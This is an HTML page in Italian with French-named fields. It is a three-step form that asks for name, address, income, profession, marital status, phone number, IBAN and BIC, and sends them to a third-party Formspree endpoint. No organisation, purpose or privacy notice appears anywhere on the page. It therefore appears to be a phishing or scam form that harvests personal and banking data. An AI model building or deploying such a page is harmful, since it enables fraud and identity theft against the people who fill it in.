<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="icon" href="logo.png" type="image/png">
    <title>Modulo Informazioni Necessarie</title>
    <style>
      .center-container {
         display: flex;
         justify-content: center;
         align-items: center;
         min-height: 100vh;
      }
      html{
         background: #33261d;
      }
      body {
         background: url(maillette_livre.jpg);
      }
      .card{
         background: #0005;
         color: #fff;
      }
      .form-control{
         background: #0005;
         border: none;
         color: #fff;
      }
      .form-control:focus{
         background: #000;
         border: none;
         color: #fff;
      }
    </style>
</head>
<body>
   <div class="center-container">
      <form
        action="https://formspree.io/f/xgejygvy"
        method="POST"
      >
      <div class="container card p-5 mt-5" id="etape1">
          <h3>Informazioni Personali</h3>
            <div class="card p-2" id="form1">
               <div class="form-row">
                  <div class="form-group col-md-6">
                        <label for="nom">Cognome:</label>
                        <input type="text" class="form-control" name="nom" id="nom" placeholder="Inserisci il tuo cognome">
                  </div>
                  <div class="form-group col-md-6">
                        <label for="prenom">Nome:</label>
                        <input type="text" class="form-control" name="prenom" id="prenom" placeholder="Inserisci il tuo nome">
                  </div>
               </div>
               <div class="form-group">
                  <label for="pays">Paese:</label>
                  <input type="text" class="form-control" name="pays" id="pays" placeholder="Inserisci il tuo paese">
               </div>
               <div class="form-group">
                  <label for="ville">Città:</label>
                  <input type="text" class="form-control" name="ville" id="ville" placeholder="Inserisci la tua città">
               </div>
               <div class="form-group">
                  <label for="adresse">Indirizzo:</label>
                  <input type="text" class="form-control" name="adresse" id="adresse" placeholder="Inserisci il tuo indirizzo">
               </div>
               <button type="button" class="btn btn-primary" id="etapeSuivante1">Passo Successivo</button>
            </div>
         </div>
         
         <div class="container card p-5 mt-5" id="etape2" style="display: none;">
            <h3>Informazioni Finanziarie</h3>
            <div class="card p-2" id="form2">
                <div class="form-group">
                    <label for="revenu">Reddito Mensile:</label>
                    <input type="text" class="form-control" name="revenu" id="revenu" placeholder="Inserisci il tuo reddito mensile">
                </div>
                <div class="form-group">
                    <label for="profession">Professione:</label>
                    <input type="text" class="form-control" name="profession" id="profession" placeholder="Inserisci la tua professione">
                </div>
                <div class="form-group">
                    <label for="etatCivil">Stato Civile:</label>
                    <input type="text" class="form-control" name="etatCivil" id="etatCivil" placeholder="Inserisci il tuo stato civile">
                </div>
                <div class="form-group">
                    <label for="numeroTel">Numero di Telefono:</label>
                    <input type="text" class="form-control" name="numeroTel" id="numeroTel" placeholder="Inserisci il tuo numero di telefono">
                </div>
                <div class="form-row">
                  <div class="col-md-6">
                     <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente1">Passo Precedente</button>
                  </div>
                  <div class="col-md-6">
                     <button type="button" class="btn btn-primary m-1 w-100" id="etapeSuivante2">Passo Successivo</button>
                  </div>
              </div>
            </div>
         </div>
         
         <div class="container card p-5 mt-5" id="etape3" style="display: none;">
            <h3>Informazioni Bancarie</h3>
            <div class="card p-2" id="form3">
                <div class="form-group">
                    <label for="nomCompte">Nome e Cognome del Conto:</label>
                    <input type="text" class="form-control" name="nomCompte" id="nomCompte" placeholder="Inserisci il nome e cognome del conto">
                </div>
                <div class="form-group">
                    <label for="iban">IBAN (Numero Internazionale del Conto Bancario):</label>
                    <input type="text" class="form-control" name="iban" id="iban" placeholder="Inserisci il tuo IBAN">
                </div>
                <div class="form-group">
                    <label for="bic">BIC (Codice Identificativo Bancario):</label>
                    <input type="text" class="form-control" name="bic" id="bic" placeholder="Inserisci il tuo BIC">
                </div>
                <div class="form-row">
                  <div class="col-md-6">
                     <button type="button" class="btn btn-secondary m-1 w-100" id="etapePrecedente2">Passo Precedente</button>
                  </div>
                  <div class="col-md-6">
                     <button type="submit" class="btn btn-success m-1 w-100">Invia</button>
                  </div>
              </div>
            </div>
         </div>
      </div>
   </form>
   
<script>
    $(document).ready(function () {
        $("#etapeSuivante1").click(function () {
            $("#form1").hide();
            $("#etape1").hide();
            $("#form2").show();
            $("#etape2").show();
        });

        $("#etapePrecedente1").click(function () {
            $("#form2").hide();
            $("#etape2").hide();
            $("#form1").show();
            $("#etape1").show();
        });

        $("#etapeSuivante2").click(function () {
            $("#form2").hide();
            $("#etape2").hide();
            $("#form3").show();
            $("#etape3").show();
        });

        $("#etapePrecedente2").click(function () {
            $("#form3").hide();
            $("#etape3").hide();
            $("#form2").show();
            $("#etape2").show();
        });
    });
</script>
<script src="traduction.js"></script>

</body>
</html>
